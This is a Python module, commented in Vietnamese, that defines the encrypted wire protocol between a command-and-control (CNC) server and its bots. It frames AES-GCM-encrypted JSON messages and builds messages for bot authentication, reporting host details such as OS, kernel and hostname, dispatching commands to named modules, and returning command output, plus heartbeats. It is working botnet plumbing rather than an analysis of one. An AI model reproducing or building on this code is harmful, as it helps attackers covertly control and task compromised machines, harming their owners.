"""
Giao thức message giữa CNC server và bot.

Định dạng wire format:
    [4 byte: payload length (network byte order)]
    [payload: AES-GCM encrypted JSON]

Message JSON structure:
    {
        "type": "auth" | "auth_ack" | "info" | "cmd" | "result" | "heartbeat" | "error",
        "id": "<uuid>",
        "timestamp": <unix epoch float>,
        "nonce": "<16 byte hex>",
        "data": { ... }
    }
"""

import json
import os
import struct
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum

from shared.crypto import AESCrypto


class MessageType(str, Enum):
    AUTH = "auth"
    AUTH_ACK = "auth_ack"
    INFO = "info"
    CMD = "cmd"
    RESULT = "result"
    HEARTBEAT = "heartbeat"
    ERROR = "error"


@dataclass
class Message:
    type: str
    id: str = field(default_factory=lambda: str(uuid.uuid4()))
    timestamp: float = field(default_factory=time.time)
    nonce: str = field(default_factory=lambda: os.urandom(16).hex())
    data: dict = field(default_factory=dict)

    def to_json(self) -> bytes:
        return json.dumps({
            "type": self.type,
            "id": self.id,
            "timestamp": self.timestamp,
            "nonce": self.nonce,
            "data": self.data,
        }).encode()

    @classmethod
    def from_json(cls, raw: bytes) -> "Message":
        obj = json.loads(raw)
        return cls(
            type=obj["type"],
            id=obj["id"],
            timestamp=obj["timestamp"],
            nonce=obj["nonce"],
            data=obj.get("data", {}),
        )


def serialize(msg: Message, crypto: AESCrypto) -> bytes:
    """Chuyển Message thành wire format: [4 byte len][AES-GCM(json)]"""
    payload = crypto.encrypt(msg.to_json())
    header = struct.pack(">I", len(payload))
    return header + payload


def deserialize(data: bytes, crypto: AESCrypto) -> Message:
    """Parse wire format thành Message."""
    if len(data) < 4:
        raise ValueError("Data quá ngắn, thiếu length header")
    length = struct.unpack(">I", data[:4])[0]
    encrypted = data[4:4 + length]
    plaintext = crypto.decrypt(encrypted)
    return Message.from_json(plaintext)


def create_auth(bot_id: str, key_hash: str) -> Message:
    return Message(type=MessageType.AUTH, data={"bot_id": bot_id, "key_hash": key_hash})


def create_auth_ack(status: str, session_id: str = "") -> Message:
    return Message(type=MessageType.AUTH_ACK, data={"status": status, "session_id": session_id})


def create_info(os_name: str, os_version: str, arch: str, kernel: str, hostname: str) -> Message:
    return Message(type=MessageType.INFO, data={
        "os": os_name,
        "os_version": os_version,
        "arch": arch,
        "kernel": kernel,
        "hostname": hostname,
    })


def create_cmd(cmd_id: str, module: str, params: dict) -> Message:
    return Message(type=MessageType.CMD, data={"cmd_id": cmd_id, "module": module, "params": params})


def create_result(cmd_id: str, output: str, exit_code: int) -> Message:
    return Message(type=MessageType.RESULT, data={"cmd_id": cmd_id, "output": output, "exit_code": exit_code})


def create_heartbeat() -> Message:
    return Message(type=MessageType.HEARTBEAT)


def create_error(code: str, message: str) -> Message:
    return Message(type=MessageType.ERROR, data={"code": code, "message": message})
